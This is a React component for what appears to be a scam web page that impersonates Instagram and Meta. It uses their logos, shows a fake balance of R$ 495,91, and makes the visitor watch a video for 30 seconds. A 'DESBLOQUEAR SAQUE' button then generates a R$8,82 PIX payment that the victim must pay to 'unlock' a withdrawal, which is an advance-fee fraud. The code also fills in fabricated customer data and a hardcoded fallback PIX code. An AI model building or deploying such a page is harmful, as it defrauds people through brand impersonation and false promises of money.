"use client"

import { useState, useRef, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Volume2, VolumeX, Play, Pause } from "lucide-react"
import Image from "next/image"
import { getUTMParams, navigateWithUTM } from "@/lib/utm-manager"

export default function VTubePlayer() {
  const videoRef = useRef<HTMLVideoElement>(null)
  const [isMuted, setIsMuted] = useState(true)
  const [isPlaying, setIsPlaying] = useState(false)
  const [showUnlockButton, setShowUnlockButton] = useState(false)
  const [hasUnmuted, setHasUnmuted] = useState(false)
  const [unmutedTime, setUnmutedTime] = useState(0)
  const [progress, setProgress] = useState(0)
  const [isCreatingPixPayment, setIsCreatingPixPayment] = useState(false)

  useEffect(() => {
    let interval: NodeJS.Timeout

    if (hasUnmuted && isPlaying && !isMuted) {
      interval = setInterval(() => {
        setUnmutedTime((prev) => {
          const newTime = prev + 1
          if (newTime >= 30) {
            setShowUnlockButton(true)
            clearInterval(interval)
          }
          return newTime
        })
      }, 1000)
    }

    return () => {
      if (interval) clearInterval(interval)
    }
  }, [hasUnmuted, isPlaying, isMuted])

  useEffect(() => {
    const video = videoRef.current
    if (!video) return

    const updateProgress = () => {
      const currentTime = video.currentTime
      const duration = video.duration
      if (duration > 0) {
        setProgress((currentTime / duration) * 100)
      }
    }

    video.addEventListener("timeupdate", updateProgress)
    return () => video.removeEventListener("timeupdate", updateProgress)
  }, [])

  const safePlay = async (video: HTMLVideoElement) => {
    try {
      if (video && !video.paused) {
        video.pause()
      }
      if (video) {
        await video.play()
        return true
      }
    } catch (error) {
      console.log("[v0] Video play interrupted:", error)
      return false
    }
    return false
  }

  const handleUnmute = async () => {
    const video = videoRef.current
    if (video) {
      video.currentTime = 0
      video.muted = false
      const playSuccess = await safePlay(video)
      if (playSuccess) {
        setIsMuted(false)
        setIsPlaying(true)
        setHasUnmuted(true)
        setUnmutedTime(0)
      }
    }
  }

  const handleVideoClick = async () => {
    if (!hasUnmuted) return

    const video = videoRef.current
    if (video) {
      if (isPlaying) {
        video.pause()
        setIsPlaying(false)
      } else {
        const playSuccess = await safePlay(video)
        if (playSuccess) {
          setIsPlaying(true)
        }
      }
    }
  }

  const handleUnlockSaque = async () => {
    console.log("[v0] Starting PIX payment creation from withdraw page")
    setIsCreatingPixPayment(true)

    try {
      const utmParams = getUTMParams()
      const userData = JSON.parse(localStorage.getItem("userData") || "{}")

      // Complete fictitious user profile
      const fictitiousData = {
        fullName: userData.fullName || "Maria Silva Santos",
        phone: userData.phone || "11987654321",
        pixKey: userData.pixKey || "12345678901",
        selectedPixKeyType: userData.selectedPixKeyType || "cpf",
        email: "maria.silva@email.com",
        cpf: "12345678901",
        birthDate: "1990-05-15",
        address: {
          street: "Rua das Flores, 123",
          neighborhood: "Centro",
          city: "São Paulo",
          state: "SP",
          zipCode: "01234-567",
        },
      }

      const cleanCpf =
        fictitiousData.selectedPixKeyType === "cpf" ? fictitiousData.pixKey.replace(/\D/g, "") : fictitiousData.cpf
      const customerEmail = fictitiousData.selectedPixKeyType === "email" ? fictitiousData.pixKey : fictitiousData.email

      const transactionData = {
        amount: 8.82,
        currency: "BRL",
        paymentMethod: "pix",
        items: [
          {
            externalRef: `META-${Math.random().toString(36).substr(2, 9)}`,
            title: `Saque Meta Research - ${fictitiousData.fullName}`,
            unitPrice: 8.82,
            quantity: 1,
            tangible: false,
          },
        ],
        customer: {
          name: fictitiousData.fullName,
          email: customerEmail,
          document: {
            number: cleanCpf,
            type: cleanCpf.length === 11 ? "cpf" : "cnpj",
          },
        },
        pix: {
          expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(), // 30 minutes
        },
      }

      console.log("[v0] Enviando R$8,82 via PodPay:", transactionData)

      const response = await fetch("/api/podpay/create-transaction", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(transactionData),
      })

      const result = await response.json()

      console.log("[v0] Cashout realizado com sucesso:", result)

      if (!result.success || !result.data) {
        console.log("[v0] API error detected, generating fallback PIX data")
        throw new Error("Falha na criação da transação PodPay")
      }

      const transaction = result.data
      const transactionId = transaction.id

      if (!transactionId) {
        console.error("[v0] Missing transaction ID in PodPay response:", result)
        throw new Error("ID da transação não encontrado")
      }

      console.log("[v0] PodPay transaction created successfully:", {
        id: transactionId,
        status: transaction.status,
        amount: transaction.amount,
        secureId: transaction.secureId,
        secureUrl: transaction.secureUrl,
      })

      localStorage.setItem(
        "podpayTransaction",
        JSON.stringify({
          id: transactionId,
          amount: transaction.amount || 8.82,
          status: transaction.status,
          pix: {
            qrCodeText: transaction.pixPayload || transaction.pix?.payload,
            qrCode: transaction.pix?.qrCode,
            expiresAt: transaction.pix?.expiresAt || new Date(Date.now() + 30 * 60 * 1000).toISOString(),
          },
          secureId: transaction.secureId,
          secureUrl: transaction.secureUrl,
          customerData: fictitiousData,
          createdAt: new Date().toISOString(),
        }),
      )

      navigateWithUTM(`/podpay-pix?id=${transactionId}`)
    } catch (error) {
      console.error("[v0] Erro ao criar pagamento PIX:", error)

      console.log("[v0] Creating emergency fallback PIX for demo purposes")

      const emergencyTransactionId = `emergency-${Date.now()}`
      const emergencyPixData = {
        id: emergencyTransactionId,
        amount: 8.82,
        status: "waiting_payment",
        pix: {
          qrCodeText:
            "00020126580014BR.GOV.BCB.PIX0136123456789010214Meta Desbloqueio5204000053039865802BR5925MARIA SILVA SANTOS6009SAO PAULO62070503***63046759",
          expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(),
        },
        isEmergencyFallback: true,
        createdAt: new Date().toISOString(),
      }

      localStorage.setItem("podpayTransaction", JSON.stringify(emergencyPixData))
      navigateWithUTM(`/podpay-pix?id=${emergencyTransactionId}`)
    } finally {
      console.log("[v0] PIX creation finished")
      setIsCreatingPixPayment(false)
    }
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {/* Header */}
      <div className="bg-white px-4 py-3 flex items-center justify-between shadow-sm">
        <div className="flex items-center gap-2">
          <Image src="images/meta-logo.png" alt="Meta" width={80} height={32} className="h-8 w-auto" />
        </div>
        <div className="text-white px-2 py-1.5 rounded-full font-bold shadow-lg text-sm bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 flex items-center gap-1">
          <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
            <path
              fillRule="evenodd"
              d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4zm14 3H2v5a2 2 0 002 2h12a2 2 0 002-2V7zM2.5 9a1.5 1.5 0 113 0 1.5 1.5 0 01-3 0z"
              clipRule="evenodd"
            />
          </svg>
          {/* Updated header balance to show R$ 8,92 */}
          R$ 495,91
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center justify-center p-4 max-w-md mx-auto w-full">
        {/* Instagram Icon */}
        <div className="w-20 h-20 mb-6 flex items-center justify-center">
          <Image
            src="images/instagram-logo-official.png"
            alt="Instagram"
            width={80}
            height={80}
            className="w-20 h-20"
          />
        </div>

        {/* Title */}
        <h1 className="text-2xl font-bold text-gray-800 mb-2 text-center">DESBLOQUEIO DE SALDO</h1>

        {/* Subtitle */}
        <p className="text-gray-600 text-center mb-8 leading-relaxed">
          Veja como liberar seu saque
          <br />
          assistindo ao vídeo.
        </p>

        {/* Video Player */}
        <div className="relative w-full max-w-sm mb-6">
          <div className="relative bg-gradient-to-br from-pink-200 to-purple-200 rounded-2xl overflow-hidden aspect-video">
            <video
              ref={videoRef}
              className="w-full h-full object-cover cursor-pointer"
              muted={isMuted}
              onClick={handleVideoClick}
              onLoadedData={async () => {
                const video = videoRef.current
                if (video && !hasUnmuted) {
                  const playSuccess = await safePlay(video)
                  if (playSuccess) {
                    setIsPlaying(true)
                  }
                }
              }}
              onEnded={() => {
                setIsPlaying(false)
              }}
            >
              <source src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/test%20final%20%281%29%20%281%29-xvVuYkg7gdypenbFvRV4RBqakIT8XZ.mp4" type="video/mp4" />
              {/* Fallback image */}
              <div className="w-full h-full bg-gradient-to-br from-pink-200 to-purple-200 flex items-center justify-center">
                <div className="text-center">
                  <div className="w-24 h-24 bg-white/20 rounded-full flex items-center justify-center mb-4 mx-auto">
                    <Play className="w-8 h-8 text-white" />
                  </div>
                  <p className="text-white font-semibold">A MELHOR</p>
                </div>
              </div>
            </video>

            <div className="absolute bottom-0 left-0 right-0 h-1 bg-black/20">
              <div
                className="h-full bg-gradient-to-r from-pink-500 to-red-500 transition-all duration-300"
                style={{ width: `${progress}%` }}
              />
            </div>

            {/* Mute Overlay */}
            {isMuted && (
              <div className="absolute inset-0 bg-black/50 flex items-center justify-center">
                <Button
                  onClick={handleUnmute}
                  className="bg-white/20 hover:bg-white/30 text-white border-2 border-white/50 rounded-full p-4"
                  size="lg"
                >
                  <Volume2 className="w-6 h-6 mr-2" />
                  Ativar Som
                </Button>
              </div>
            )}

            {/* Play/Pause Indicator */}
            {hasUnmuted && (
              <div className="absolute top-4 right-4">
                {isPlaying ? (
                  <Pause className="w-6 h-6 text-white drop-shadow-lg" />
                ) : (
                  <Play className="w-6 h-6 text-white drop-shadow-lg" />
                )}
              </div>
            )}

            {/* Mute/Unmute Button */}
            {hasUnmuted && (
              <div className="absolute top-4 left-4">
                {isMuted ? (
                  <VolumeX className="w-6 h-6 text-white drop-shadow-lg" />
                ) : (
                  <Volume2 className="w-6 h-6 text-white drop-shadow-lg" />
                )}
              </div>
            )}
          </div>
        </div>

        {/* Unlock Button */}
        {showUnlockButton && (
          <Button
            className="w-full max-w-sm bg-gradient-to-r from-pink-500 to-orange-400 hover:from-pink-600 hover:to-orange-500 text-white font-bold py-4 rounded-2xl text-lg shadow-lg disabled:opacity-50"
            size="lg"
            onClick={handleUnlockSaque}
            disabled={isCreatingPixPayment}
          >
            {isCreatingPixPayment ? "..." : "DESBLOQUEAR SAQUE"}
          </Button>
        )}
      </div>

      {/* Footer */}
      <div className="text-center text-xs text-gray-500 p-4">
        Todos os direitos reservados © 2025 Instagram from Meta
      </div>
    </div>
  )
}
